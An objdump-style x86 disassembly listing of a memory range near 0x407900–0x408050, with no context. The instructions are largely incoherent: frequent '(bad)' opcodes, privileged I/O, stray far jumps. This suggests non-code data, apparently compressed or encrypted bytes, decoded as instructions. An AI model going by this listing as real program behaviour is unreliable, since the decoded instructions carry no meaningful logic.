  4078a3:	mov    cs,WORD PTR [eax+0x5a]
  4078a6:	fdiv   QWORD PTR [ecx+0x17815cc5]
  4078ac:	mov    dh,0x36
  4078ae:	adc    al,bh
  4078b0:	inc    edx
  4078b1:	or     DWORD PTR [edx-0x21],esp
  4078b4:	jge    0x40787c
  4078b6:	mov    esp,0x9f4eb78e
  4078bb:	or     al,0xba
  4078bd:	sbb    BYTE PTR ds:0xa5eb6e64,bl
  4078c3:	ds lock mov edi,ebp
  4078c7:	lock cmp bh,ah
  4078ca:	xchg   edi,ebx
  4078cc:	mov    ds:0x61ddb5f9,eax
  4078d1:	es pop ecx
  4078d3:	inc    ebx
  4078d4:	adc    edx,DWORD PTR [edi+esi*2+0x6894611f]
  4078db:	add    al,0x60
  4078dd:	xchg   ebp,eax
  4078de:	dec    edx
  4078df:	fcmove st,st(0)
  4078e1:	lods   al,BYTE PTR ds:[esi]
  4078e2:	pop    eax
  4078e3:	mov    ebx,ecx
  4078e5:	sub    eax,0xe1d213d5
  4078ea:	xchg   ecx,eax
  4078eb:	jns    0x40787f
  4078ed:	aaa    
  4078ee:	jge    0x40792b
  4078f0:	js     0x407887
  4078f2:	adc    DWORD PTR [ebp-0x45],eax
  4078f5:	jmp    0x1f2a:0xc4c81173
  4078fc:	add    ecx,esi
  4078fe:	jo     0x4078ec
  407900:	pop    ebp
  407901:	and    BYTE PTR [esi-0x3e],ch
  407904:	cmp    BYTE PTR [ebp+0x31d3fe7d],ch
  40790a:	cld    
  40790b:	call   0xab28d5c8
  407910:	nop
  407911:	or     bl,bh
  407913:	pop    ss
  407914:	adc    BYTE PTR [esi+0x78],al
  407917:	aaa    
  407918:	mov    eax,ds:0xf54a337d
  40791d:	fcmovnbe st,st(0)
  40791f:	lea    ebx,[edx+0x70508c22]
  407925:	mov    ebx,0x9be176ab
  40792a:	add    eax,0xe54cb5ee
  40792f:	loopne 0x407927
  407931:	cwde   
  407932:	sub    BYTE PTR [edi+0x75],dl
  407935:	cmp    eax,0x29fe1367
  40793a:	fwait
  40793b:	das    
  40793c:	in     eax,dx
  40793d:	lea    esi,[ecx]
  40793f:	fidivr DWORD PTR [ebx-0x71]
  407942:	xchg   esp,eax
  407943:	add    BYTE PTR [edi+0x74acdbcc],ah
  407949:	and    eax,0x74f2c9d9
  40794e:	xor    al,0xc5
  407950:	xor    al,BYTE PTR [ebp+ebp*8-0x60]
  407954:	pop    esp
  407955:	cs push 0xfffffff9
  407958:	xchg   DWORD PTR [esi],ecx
  40795a:	inc    ebp
  40795b:	add    cl,BYTE PTR [edi+0x4b]
  40795e:	xor    BYTE PTR fs:[edx+0x7a],cl
  407962:	arpl   sp,dx
  407964:	and    eax,0xb01e8c4d
  407969:	jge    0x407959
  40796b:	and    ah,dl
  40796d:	loope  0x407936
  40796f:	icebp  
  407970:	gs es repz and bh,dl
  407975:	sub    al,ch
  407977:	fmul   DWORD PTR [edi+ebx*8+0xa02f9b]
  40797e:	inc    esp
  40797f:	in     al,dx
  407980:	aam    0xbb
  407982:	sbb    ah,dl
  407984:	dec    esp
  407985:	lds    ebp,FWORD PTR [ebp+0x13]
  407988:	sbb    al,0xa8
  40798a:	or     esp,0xffffffd3
  40798d:	jge    0x407988
  40798f:	add    BYTE PTR [ecx-0x62d81fe2],ch
  407995:	push   esi
  407996:	xchg   ecx,eax
  407997:	icebp  
  407998:	ds fmulp st(6),st
  40799b:	fistp  WORD PTR [eax+0x78f710a4]
  4079a1:	pop    ebx
  4079a2:	sbb    ebx,DWORD PTR [edx]
  4079a4:	mov    ds,WORD PTR ds:0x8aba2ea3
  4079aa:	mov    ?,WORD PTR [ebx+0x4d]
  4079ad:	xor    eax,0xce67d96f
  4079b2:	dec    esi
  4079b3:	and    BYTE PTR [edx+0x4cbc9ee4],dl
  4079b9:	into   
  4079ba:	bnd call 0x9d5f497f
  4079c0:	stos   BYTE PTR es:[edi],al
  4079c1:	mov    eax,0xf3899344
  4079c6:	ins    BYTE PTR es:[edi],dx
  4079c7:	jge    0x407a36
  4079c9:	mov    ds,WORD PTR [esi-0x5c]
  4079cc:	shl    ah,cl
  4079ce:	mov    al,ds:0x6da65a74
  4079d3:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  4079d5:	test   BYTE PTR [ebx],ah
  4079d7:	cmp    al,0x7
  4079d9:	push   ds
  4079da:	in     eax,0x61
  4079dc:	nop
  4079dd:	fsubr  DWORD PTR [edx+0x4fa42535]
  4079e3:	pop    esp
  4079e4:	or     bl,ch
  4079e6:	pop    ss
  4079e7:	and    BYTE PTR [ecx],0x5e
  4079ea:	push   0xffffffe9
  4079ec:	or     bl,ah
  4079ee:	mov    esi,0x6a0d64df
  4079f3:	addr16 sti 
  4079f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079f6:	and    ebx,DWORD PTR [ebx+0x33]
  4079f9:	mov    edi,0x1f9b97c1
  4079fe:	cdq    
  4079ff:	mov    cl,0x3e
  407a01:	xchg   ebp,eax
  407a02:	sub    ebx,DWORD PTR [ecx+eax*1]
  407a05:	mov    ebx,0x9929cc8b
  407a0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a0b:	enter  0xf57b,0xd3
  407a0f:	and    esp,esp
  407a11:	clc    
  407a12:	fdivp  st(0),st
  407a14:	cli    
  407a15:	or     DWORD PTR [ebx-0x5e],0xffffffb2
  407a19:	or     BYTE PTR [ecx-0x2fde6647],dl
  407a1f:	jecxz  0x407a03
  407a21:	sub    ecx,edi
  407a23:	xchg   ecx,eax
  407a24:	repnz sbb ecx,DWORD PTR es:[edi-0x75]
  407a29:	push   cs
  407a2a:	cli    
  407a2b:	xor    esp,0x6786854c
  407a31:	dec    ebx
  407a32:	xchg   edi,eax
  407a33:	jne    0x4079fd
  407a35:	daa    
  407a36:	push   esp
  407a37:	sbb    DWORD PTR [esi+edi*8+0x32],edi
  407a3b:	or     DWORD PTR [edi],edx
  407a3d:	push   esi
  407a3e:	pop    edi
  407a3f:	push   esp
  407a40:	outs   dx,DWORD PTR ds:[esi]
  407a41:	xchg   esi,eax
  407a42:	adc    al,0xc5
  407a44:	cmp    eax,0x4c6d7b91
  407a49:	pop    esi
  407a4a:	mov    al,ds:0x4f87b17b
  407a4f:	sub    dh,0xd1
  407a52:	mov    ds:0xb625b7d6,al
  407a57:	sbb    DWORD PTR [edi],ebx
  407a59:	mov    DWORD PTR [ecx-0x244e8aff],0xd5825986
  407a63:	pop    ebx
  407a64:	mov    dh,0x81
  407a66:	cli    
  407a67:	ss inc esp
  407a69:	xchg   ebx,eax
  407a6a:	int3   
  407a6b:	out    dx,eax
  407a6c:	pushf  
  407a6d:	xchg   edx,eax
  407a6e:	add    eax,0xd028614f
  407a73:	pop    es
  407a74:	xchg   ebp,eax
  407a75:	imul   ebp,DWORD PTR [esi],0x255a57b9
  407a7b:	push   ebx
  407a7c:	mov    edx,ecx
  407a7e:	cwde   
  407a7f:	in     eax,dx
  407a80:	push   eax
  407a81:	test   DWORD PTR [esi],ebp
  407a83:	jb     0x49d9583c
  407a89:	adc    al,0x25
  407a8b:	xchg   esi,eax
  407a8c:	mov    edi,0xc0b2cbdf
  407a91:	jl     0x407a56
  407a93:	mov    al,0xcb
  407a95:	shl    BYTE PTR [edx],cl
  407a97:	data16 adc ch,dh
  407a9a:	jl     0x407ae4
  407a9c:	jnp    0x407ac6
  407a9e:	xor    al,bl
  407aa0:	mov    esi,0x8f471f7a
  407aa5:	push   esp
  407aa6:	clc    
  407aa7:	jo     0x407ae6
  407aa9:	jnp    0x407ae8
  407aab:	lds    edi,FWORD PTR [edx+0x2378a655]
  407ab1:	mov    al,0x9b
  407ab3:	adc    edx,DWORD PTR [esi+0x798d6944]
  407ab9:	bound  edi,QWORD PTR [ebp+0x150cb72a]
  407abf:	in     eax,0xef
  407ac1:	xor    DWORD PTR [esi+0x5f3f5dd2],eax
  407ac7:	rcr    dh,0xd3
  407aca:	cmp    al,ah
  407acc:	lods   eax,DWORD PTR ds:[esi]
  407acd:	lock jns 0x407adf
  407ad0:	into   
  407ad1:	sbb    edi,DWORD PTR [eax-0x7761aa33]
  407ad7:	push   ds
  407ad8:	dec    ecx
  407ad9:	leave  
  407ada:	ins    DWORD PTR es:[edi],dx
  407adb:	out    dx,eax
  407adc:	dec    ebp
  407add:	test   DWORD PTR [edi+0x8528f9e],esi
  407ae3:	rcl    DWORD PTR ds:0x439f9a91,0x10
  407aea:	(bad)  
  407aeb:	out    0xd6,al
  407aed:	stos   DWORD PTR es:[edi],eax
  407aee:	inc    esi
  407aef:	cwde   
  407af0:	(bad)  
  407af1:	and    eax,0x3dced24a
  407af6:	mov    ?,ecx
  407af8:	sub    DWORD PTR [edi],ebx
  407afa:	leave  
  407afb:	xor    al,0x76
  407afd:	es out 0x29,eax
  407b00:	lock dec edi
  407b02:	mov    BYTE PTR [edi],dh
  407b04:	and    DWORD PTR [esi],esi
  407b06:	int3   
  407b07:	cmp    ebp,0x41
  407b0a:	sub    eax,eax
  407b0c:	inc    edi
  407b0d:	ficom  WORD PTR [eax]
  407b0f:	(bad)  
  407b10:	cmp    eax,ecx
  407b12:	xor    eax,0x23db50d0
  407b17:	xchg   edx,eax
  407b18:	xor    dh,BYTE PTR [edx]
  407b1a:	jle    0x407b84
  407b1c:	xchg   edx,eax
  407b1d:	inc    ebp
  407b1e:	push   ss
  407b1f:	outs   dx,BYTE PTR ds:[esi]
  407b20:	and    BYTE PTR [esi-0xf0f0147],0x97
  407b27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b28:	fdivr  QWORD PTR [esi]
  407b2a:	jnp    0x407b0a
  407b2c:	jle    0x407af9
  407b2e:	pop    esi
  407b2f:	jnp    0x407b50
  407b31:	fidiv  DWORD PTR [ebp+eax*1-0x7f]
  407b35:	aad    0xfb
  407b37:	(bad)  
  407b38:	retf   0xf386
  407b3b:	jge    0x407b4c
  407b3d:	in     al,0x2
  407b3f:	push   ss
  407b40:	scas   eax,DWORD PTR es:[edi]
  407b41:	push   ecx
  407b42:	mov    DWORD PTR ds:0x12c2132b,edi
  407b48:	pop    ebx
  407b49:	push   0x7d6e99e8
  407b4e:	fnsave [ecx+eiz*8]
  407b51:	outs   dx,BYTE PTR ds:[esi]
  407b52:	xchg   ecx,eax
  407b53:	leave  
  407b54:	addr16 daa 
  407b56:	daa    
  407b57:	sbb    BYTE PTR [eax-0x7757b1fb],0xcc
  407b5e:	inc    ebx
  407b5f:	pop    ebp
  407b60:	pop    ecx
  407b61:	mov    ah,BYTE PTR [edx+ecx*4]
  407b64:	adc    dh,BYTE PTR [ebx+0x4fb94b78]
  407b6a:	(bad)  
  407b6b:	frstor [esi-0x6e3203a6]
  407b71:	xor    ebx,DWORD PTR [ebp-0x79]
  407b74:	das    
  407b75:	popa   
  407b76:	cmc    
  407b77:	mov    esi,0xce4f697d
  407b7c:	jns    0x407ba1
  407b7e:	rol    BYTE PTR [ebx-0x5f],1
  407b81:	leave  
  407b82:	in     al,dx
  407b83:	xor    al,0x1d
  407b85:	pop    ds
  407b86:	and    esi,DWORD PTR [eax+0x72]
  407b89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b8a:	es retf 0x4a08
  407b8e:	cli    
  407b8f:	cmp    BYTE PTR [ebx],0xbd
  407b92:	xor    ebp,DWORD PTR [eax+ecx*2]
  407b95:	outs   dx,DWORD PTR ds:[esi]
  407b96:	sbb    ah,ah
  407b98:	xchg   ebx,eax
  407b99:	retf   0x9867
  407b9c:	test   eax,0x49b50b1f
  407ba1:	add    al,0x6d
  407ba3:	pop    DWORD PTR [edx+0x0]
  407ba6:	cmp    bh,dh
  407ba8:	stos   BYTE PTR es:[edi],al
  407ba9:	out    0x97,al
  407bab:	adc    esi,DWORD PTR [edx]
  407bad:	xor    eax,0xd9931845
  407bb2:	iret   
  407bb3:	mov    edi,0x30af1ec7
  407bb8:	push   0xffffffd4
  407bba:	dec    esi
  407bbb:	or     al,0xdf
  407bbd:	dec    ecx
  407bbe:	xchg   ebp,eax
  407bbf:	lahf   
  407bc0:	inc    ebp
  407bc1:	popa   
  407bc2:	inc    ecx
  407bc3:	cmp    ebx,DWORD PTR [ebx]
  407bc5:	add    al,0x60
  407bc7:	pop    eax
  407bc8:	mov    ?,WORD PTR [eax]
  407bca:	adc    DWORD PTR [ebx],ebp
  407bcc:	imul   esi,DWORD PTR [eax],0xffffffb2
  407bcf:	mov    ecx,0xd704d06e
  407bd4:	push   cs
  407bd5:	jge    0x407c0a
  407bd7:	out    dx,al
  407bd8:	int3   
  407bd9:	add    eax,0x8e5f467e
  407bde:	and    eax,0x259b4685
  407be3:	outs   dx,BYTE PTR ds:[esi]
  407be4:	push   ds
  407be5:	fidivr DWORD PTR ds:0xfcbeddbe
  407beb:	aam    0x1d
  407bed:	adc    DWORD PTR [esi],0x2a6026a8
  407bf3:	in     al,0xf7
  407bf5:	not    DWORD PTR [ebx-0x7]
  407bf8:	aad    0x4e
  407bfa:	ss (bad) 
  407bfc:	xchg   esp,eax
  407bfd:	inc    ecx
  407bfe:	arpl   WORD PTR [ebp+0x20],sp
  407c01:	les    esi,FWORD PTR [ebp+0x4a]
  407c04:	or     ebx,DWORD PTR [ebx-0x38]
  407c07:	push   ds
  407c08:	sar    BYTE PTR ds:0x92ee9966,0x57
  407c0f:	cdq    
  407c10:	mov    bl,0x7a
  407c12:	call   0x3ff1a13c
  407c17:	adc    esi,DWORD PTR [ebx+0x38]
  407c1a:	mov    ebp,0x56a04061
  407c1f:	and    edx,DWORD PTR [ebp+0xb29748d]
  407c25:	retf   
  407c26:	cmp    bh,BYTE PTR [edx]
  407c28:	arpl   WORD PTR [esi],bx
  407c2a:	inc    esp
  407c2b:	jmp    0x407c67
  407c2d:	dec    ecx
  407c2e:	pushf  
  407c2f:	repnz in eax,dx
  407c31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c32:	xchg   ecx,eax
  407c33:	mov    cl,0xbd
  407c35:	(bad)  
  407c36:	jl     0x407bf7
  407c38:	xchg   esi,eax
  407c39:	dec    eax
  407c3a:	cmp    eax,0xf13d6dd7
  407c3f:	cmp    eax,0x26f984c5
  407c44:	test   BYTE PTR [edx+0x52],dl
  407c47:	inc    edx
  407c48:	mov    ecx,0xffd7968d
  407c4d:	and    edx,ecx
  407c4f:	push   ss
  407c50:	dec    edi
  407c51:	nop
  407c52:	push   cs
  407c53:	sub    ebx,DWORD PTR [esi*8-0x112be63c]
  407c5a:	icebp  
  407c5b:	fistp  DWORD PTR [eax+ecx*8]
  407c5e:	dec    esp
  407c5f:	jo     0x407cbd
  407c61:	mov    eax,ds:0xc0155bf8
  407c66:	push   ds
  407c67:	leave  
  407c68:	hlt    
  407c69:	inc    ecx
  407c6a:	jne    0x407c68
  407c6c:	test   eax,0x384b48b7
  407c71:	mov    ds:0x7dffff73,eax
  407c76:	or     dl,ch
  407c78:	push   eax
  407c79:	dec    eax
  407c7a:	mov    bh,0xda
  407c7c:	dec    ebx
  407c7d:	clc    
  407c7e:	mov    al,0x7c
  407c80:	sbb    ecx,DWORD PTR [ebx-0x1d14a672]
  407c86:	mov    bl,0xa
  407c88:	aam    0xe9
  407c8a:	stc    
  407c8b:	repnz icebp 
  407c8d:	pushf  
  407c8e:	push   edx
  407c8f:	jg     0x407c4f
  407c91:	dec    BYTE PTR [ebp-0x1]
  407c94:	data16 sub al,0xea
  407c97:	add    cl,BYTE PTR [esi+edx*2]
  407c9a:	push   ecx
  407c9b:	jp     0x407c8a
  407c9d:	out    dx,eax
  407c9e:	xchg   ecx,eax
  407c9f:	imul   edx,DWORD PTR ds:0x49e34f2c,0xbd1540bb
  407ca9:	in     al,dx
  407caa:	lahf   
  407cab:	out    dx,eax
  407cac:	cmp    al,BYTE PTR [edx+ecx*2+0x52]
  407cb0:	mov    ecx,0x39bb9bee
  407cb5:	pop    esp
  407cb6:	icebp  
  407cb7:	aas    
  407cb8:	jle    0x407cc7
  407cba:	scas   al,BYTE PTR es:[edi]
  407cbb:	mov    esp,0x92cd4f22
  407cc0:	mov    edx,0x97c5b4ba
  407cc5:	xchg   esi,eax
  407cc6:	or     DWORD PTR [edx],0x7a28710c
  407ccc:	cdq    
  407ccd:	clc    
  407cce:	cmp    eax,0x48bc2b1
  407cd3:	mov    ebp,DWORD PTR [eax-0xb]
  407cd6:	leave  
  407cd7:	push   0x3f
  407cd9:	cmp    BYTE PTR [ecx-0x199c8fb],bh
  407cdf:	(bad)  
  407ce0:	xor    al,0x79
  407ce2:	outs   dx,DWORD PTR ds:[esi]
  407ce3:	jecxz  0x407d51
  407ce5:	or     dh,cl
  407ce7:	test   DWORD PTR [edi],ebp
  407ce9:	pop    eax
  407cea:	cmp    eax,0xbee50ca6
  407cef:	xor    eax,0x52453be0
  407cf4:	daa    
  407cf5:	add    bh,ch
  407cf7:	mov    ebp,0xd4b819ca
  407cfc:	sahf   
  407cfd:	push   esp
  407cfe:	fcmovb st,st(6)
  407d00:	jo     0x407cb5
  407d02:	ror    BYTE PTR [edi],cl
  407d04:	sbb    DWORD PTR [edi-0x448c7da5],edi
  407d0a:	imul   edi,edi,0x4
  407d0d:	fild   WORD PTR [esi]
  407d0f:	and    edi,DWORD PTR [edx+0x39]
  407d12:	outs   dx,DWORD PTR ds:[esi]
  407d13:	cmp    eax,0x5c87afe8
  407d18:	mov    bh,0xf9
  407d1a:	inc    esp
  407d1b:	js     0x407d7d
  407d1d:	dec    ecx
  407d1e:	inc    edi
  407d1f:	xchg   edx,eax
  407d20:	mov    es,WORD PTR [edi-0x10]
  407d23:	xchg   ecx,eax
  407d24:	rcl    DWORD PTR [ecx-0x4ed55d32],0x63
  407d2b:	jmp    0x4fa6:0x6f918f9d
  407d32:	xchg   edx,eax
  407d33:	shl    DWORD PTR ds:0x5e4eb9d2,0x30
  407d3a:	and    DWORD PTR [edx-0x588eeea5],eax
  407d40:	pop    esp
  407d41:	jo     0x407d9d
  407d43:	retf   0x49a
  407d46:	and    BYTE PTR [esi+0x59],al
  407d49:	cdq    
  407d4a:	ror    BYTE PTR [edi],1
  407d4c:	test   eax,0xaeb8dcd8
  407d51:	ret    0x84ab
  407d54:	ja     0x407dae
  407d56:	rcl    DWORD PTR [ecx],0x6b
  407d59:	sbb    DWORD PTR [edi-0x5e],edx
  407d5c:	les    esi,FWORD PTR [ebx-0x69]
  407d5f:	adc    DWORD PTR [ebx],edi
  407d61:	arpl   WORD PTR [edx+ebx*8-0x7420d7e0],cx
  407d68:	pop    ss
  407d69:	aad    0xcc
  407d6b:	retf   0x5eee
  407d6e:	xchg   edi,eax
  407d6f:	adc    ah,dl
  407d71:	mov    ecx,0xf1660e15
  407d76:	call   0x3f11:0x7da5a758
  407d7d:	imul   BYTE PTR [ecx+0x2a7f4fb]
  407d83:	arpl   WORD PTR [edi-0x44],bx
  407d86:	mov    al,ds:0xca1842d1
  407d8b:	loopne 0x407d10
  407d8d:	mov    bh,0x54
  407d8f:	mov    ebx,0x5a974502
  407d94:	enter  0x1b61,0x61
  407d98:	gs jge 0x407d82
  407d9b:	push   0xd0d6443a
  407da0:	xor    BYTE PTR [ebp-0x45],0x91
  407da4:	mov    esp,0xe22e4533
  407da9:	in     al,dx
  407daa:	dec    eax
  407dab:	sbb    BYTE PTR [ecx],0x5
  407dae:	inc    ebp
  407daf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407db0:	sub    dh,BYTE PTR [edi]
  407db2:	repz clc 
  407db4:	sar    cl,cl
  407db6:	mov    ecx,0x23f45832
  407dbb:	or     cl,BYTE PTR [ecx+0x7]
  407dbe:	mov    ah,0x55
  407dc0:	loopne 0x407d81
  407dc2:	paddq  mm1,QWORD PTR ds:[eax+ebx*2+0x30]
  407dc8:	pop    eax
  407dc9:	stos   BYTE PTR es:[edi],al
  407dca:	imul   esi,DWORD PTR [esi-0x13],0x4e49b2e4
  407dd1:	enter  0xb0a8,0xa2
  407dd5:	daa    
  407dd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407dd7:	ret    0xc531
  407dda:	loope  0x407d66
  407ddc:	test   esp,edi
  407dde:	add    DWORD PTR [edx-0x385f3fa8],esi
  407de4:	fbstp  TBYTE PTR [esi]
  407de6:	push   ss
  407de7:	sbb    DWORD PTR [edi+0x34],0xffffffbf
  407deb:	mov    bh,0x58
  407ded:	mov    bh,0xaa
  407def:	std    
  407df0:	cmp    DWORD PTR gs:[edx+edi*4+0x7a3bfd8c],0x35
  407df9:	or     ebx,DWORD PTR [eax+ecx*4+0x39]
  407dfd:	inc    eax
  407dfe:	sbb    DWORD PTR [esp+eax*2+0x7aeb909c],eax
  407e05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e06:	popf   
  407e07:	lahf   
  407e08:	add    BYTE PTR [ebp+ebp*1-0x56],dh
  407e0c:	xchg   ebx,eax
  407e0d:	scas   al,BYTE PTR es:[edi]
  407e0e:	stos   DWORD PTR es:[edi],eax
  407e0f:	call   0xaffd:0x7d4ad464
  407e16:	std    
  407e17:	xor    DWORD PTR [edx-0x67],edi
  407e1a:	stos   DWORD PTR es:[edi],eax
  407e1b:	inc    edi
  407e1c:	jo     0x407da4
  407e1e:	or     esi,DWORD PTR [edx]
  407e20:	push   0xffffffbf
  407e22:	push   ebp
  407e23:	xor    DWORD PTR [ecx-0x40],0xffffffcc
  407e27:	les    edx,FWORD PTR [esi-0x77654fe1]
  407e2d:	and    eax,0x658f88e3
  407e32:	xchg   ebp,eax
  407e33:	mov    WORD PTR [ecx+0x3a],?
  407e36:	fistp  WORD PTR [ebx+0xe]
  407e39:	jge    0x407e69
  407e3b:	sbb    al,0xdc
  407e3d:	gs pop eax
  407e3f:	nop
  407e40:	sub    al,0xa7
  407e42:	ficom  DWORD PTR [esi+esi*4-0x56433102]
  407e49:	or     edx,ebx
  407e4b:	cmc    
  407e4c:	inc    edi
  407e4d:	hlt    
  407e4e:	push   esi
  407e4f:	sbb    BYTE PTR [ecx],bh
  407e51:	cmp    DWORD PTR [edx+ebp*1],ebx
  407e54:	(bad)  
  407e56:	dec    ecx
  407e57:	mov    cl,0xc1
  407e59:	dec    edi
  407e5a:	lahf   
  407e5b:	add    esi,DWORD PTR [ecx+ebp*4+0x6c74df9f]
  407e62:	pushf  
  407e63:	lods   eax,DWORD PTR ds:[esi]
  407e64:	add    BYTE PTR [ebx+edi*2-0x77777860],al
  407e6b:	jle    0x407e88
  407e6d:	hlt    
  407e6e:	sub    bl,ch
  407e70:	mov    ds:0x6fe75ce4,al
  407e75:	push   ds
  407e76:	inc    eax
  407e77:	jecxz  0x407e07
  407e79:	and    BYTE PTR [ebp+0x4f3d03da],bh
  407e7f:	pop    es
  407e80:	push   0xc978cf7f
  407e85:	(bad)
  407e88:	retf   0x8578
  407e8b:	(bad)  
  407e8d:	or     BYTE PTR [ecx-0x47],bh
  407e90:	jl     0x407e55
  407e92:	xrstor [ecx+0x45a52685]
  407e99:	jae    0x407ea7
  407e9b:	std    
  407e9c:	dec    esi
  407e9d:	xchg   edx,eax
  407e9e:	inc    eax
  407e9f:	mov    eax,ds:0xa4ecfd0f
  407ea4:	mov    al,0x28
  407ea6:	into   
  407ea7:	int3   
  407ea8:	push   edi
  407ea9:	lods   al,BYTE PTR ds:[esi]
  407eaa:	fisttp QWORD PTR [ebp+0x39]
  407ead:	mov    edi,ebp
  407eaf:	mov    dh,0x89
  407eb1:	pop    ds
  407eb2:	xchg   edx,eax
  407eb3:	cld    
  407eb4:	sbb    DWORD PTR [edx],ecx
  407eb6:	test   eax,0x3d5ed20b
  407ebb:	popf   
  407ebc:	jp     0x407ea4
  407ebe:	pop    ss
  407ebf:	pop    edi
  407ec0:	out    0x24,al
  407ec2:	dec    edi
  407ec3:	push   ss
  407ec4:	pushf  
  407ec5:	out    dx,al
  407ec6:	pop    ds
  407ec7:	fimul  WORD PTR [esi-0x46]
  407eca:	dec    edi
  407ecb:	leave  
  407ecc:	or     dl,BYTE PTR ds:0x82c8991
  407ed2:	in     al,dx
  407ed3:	dec    ecx
  407ed4:	stos   BYTE PTR es:[edi],al
  407ed5:	fdivr  QWORD PTR [ebx-0x31]
  407ed8:	xchg   BYTE PTR [ebp-0x4f993363],bh
  407ede:	(bad)  
  407edf:	mov    eax,ds:0x525d1ef7
  407ee4:	je     0x407efd
  407ee6:	push   ss
  407ee7:	cmp    edi,DWORD PTR [eax+0xc5fcd03]
  407eed:	dec    ebx
  407eee:	dec    ebx
  407eef:	mov    ch,BYTE PTR [esi-0x6]
  407ef2:	fisttp QWORD PTR [ebp+eiz*8+0x6ae83e23]
  407ef9:	addr16 mov bh,0xad
  407efc:	loopne 0x407eab
  407efe:	pop    esp
  407eff:	int    0x5
  407f01:	adc    DWORD PTR [ebp+0x70],ebx
  407f04:	lods   al,BYTE PTR ds:[esi]
  407f05:	addr16 loop 0x407f50
  407f08:	pop    eax
  407f09:	mov    esp,0x7f307a07
  407f0f:	xor    DWORD PTR [eax],0xffffffda
  407f12:	stc    
  407f13:	cli    
  407f14:	lea    esi,[ecx]
  407f16:	mov    edx,esp
  407f18:	repnz inc esi
  407f1a:	jbe    0x407ebd
  407f1c:	fnstsw WORD PTR [ebx]
  407f1e:	adc    eax,0x6cac41c6
  407f23:	mov    ebp,0xf43d0974
  407f28:	dec    ebx
  407f29:	sbb    bl,bh
  407f2b:	out    0xc6,eax
  407f2d:	sbb    dh,BYTE PTR ds:0x50c76c63
  407f33:	sbb    ecx,DWORD PTR ds:0xb8875ea9
  407f39:	cli    
  407f3a:	jmp    0x2439e1e6
  407f3f:	add    BYTE PTR [eax+0x1],bh
  407f42:	pop    ebx
  407f43:	xchg   bh,bh
  407f45:	pop    ebp
  407f46:	jnp    0x407f7a
  407f48:	push   cs
  407f49:	jecxz  0x407f21
  407f4b:	jnp    0x407efb
  407f4d:	add    DWORD PTR [eax-0xbfd9c16],eax
  407f53:	inc    esp
  407f54:	aaa    
  407f55:	test   ecx,ecx
  407f57:	push   esi
  407f58:	rcr    DWORD PTR [esi+edx*1+0x493b3418],cl
  407f5f:	jge    0x407f29
  407f61:	or     BYTE PTR [ecx],0xee
  407f64:	jne    0x407f19
  407f66:	mov    WORD PTR [eax-0x76c85cb7],cs
  407f6c:	cmp    cl,BYTE PTR [ebx]
  407f6e:	inc    esi
  407f6f:	call   0xf85e:0x1484943
  407f76:	sub    esp,DWORD PTR [edx-0x11]
  407f79:	push   0x7ce52db1
  407f7e:	pop    esi
  407f7f:	lar    edi,ax
  407f82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f83:	lea    esp,[esi+0xf]
  407f86:	or     esp,0xb5729222
  407f8c:	sbb    BYTE PTR [ebp-0x4a512735],al
  407f92:	iret   
  407f93:	ret    0x4fcb
  407f96:	cmc    
  407f97:	ss call 0x1593:0xd5e61d2b
  407f9f:	push   0x1d
  407fa1:	jmp    0xb171:0xe9be88f7
  407fa8:	mov    ds:0xc9f192a,al
  407fad:	fwait
  407fae:	push   0x9a6cddf1
  407fb3:	stos   BYTE PTR es:[edi],al
  407fb4:	in     eax,0xda
  407fb6:	dec    ebp
  407fb7:	lods   eax,DWORD PTR ds:[esi]
  407fb8:	and    dl,BYTE PTR [edi+0x61dd920d]
  407fbe:	aad    0xfe
  407fc0:	sahf   
  407fc1:	mov    eax,ds:0xd7aef634
  407fc6:	dec    ebp
  407fc7:	(bad)  
  407fc8:	mov    ah,0xb9
  407fca:	cld    
  407fcb:	jl     0x40802a
  407fcd:	mov    al,0xd
  407fcf:	mov    ebx,0x1ffac190
  407fd4:	mov    dl,0xa2
  407fd6:	mov    dh,0xbc
  407fd8:	mov    edx,0x28cdb1d0
  407fdd:	add    BYTE PTR [ecx+eax*8+0x73],bh
  407fe1:	fistp  QWORD PTR [ecx-0x1]
  407fe4:	jne    0x407f8f
  407fe6:	adc    al,0x6
  407fe8:	inc    edi
  407fe9:	outs   dx,BYTE PTR ds:[esi]
  407fea:	push   edi
  407feb:	mov    DWORD PTR [eax-0x2],esp
  407fee:	mov    dl,0x87
  407ff0:	jle    0x408068
  407ff2:	jecxz  0x407f84
  407ff4:	jmp    0x246f5fbd
  407ff9:	mov    esp,0x2a96ddd9
  407ffe:	(bad)  
  407fff:	lods   al,BYTE PTR ds:[esi]
  408000:	adc    DWORD PTR [ecx-0x63],0xffffffb8
  408004:	ret    0x2d4f
  408007:	retf   
  408008:	loopne 0x408075
  40800a:	mov    WORD PTR [esi],?
  40800c:	std    
  40800d:	out    dx,eax
  40800e:	adc    al,0x59
  408010:	inc    ecx
  408011:	out    0x21,eax
  408013:	sbb    al,0x20
  408015:	add    eax,0xc18dcfcf
  40801a:	bound  esi,QWORD PTR [edi+eax*8-0x623cd8a0]
  408021:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408022:	dec    ebp
  408023:	test   DWORD PTR [edx],edi
  408025:	(bad)  
  408026:	adc    edi,ecx
  408028:	or     DWORD PTR [edx+0x1b],eax
  40802b:	lock mov ah,0xe2
  40802e:	test   al,0xc4
  408030:	inc    ebp
  408031:	or     ebp,ebx
  408033:	daa    
  408034:	jmp    eax
  408036:	sub    edi,DWORD PTR [ebx+0x5f]
  408039:	push   ecx
  40803a:	jecxz  0x40805b
  40803c:	sbb    esp,esp
  40803e:	fst    DWORD PTR [eax+0x25]
  408041:	daa    
  408042:	dec    BYTE PTR [esi]
  408044:	pop    ebp
  408045:	leave  
  408046:	enter  0x5204,0xa5
  40804a:	mov    dl,0x5
  40804c:	inc    ebx
  40804d:	and    al,0x6a
  40804f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408050:	fistp  WORD PTR [ecx]
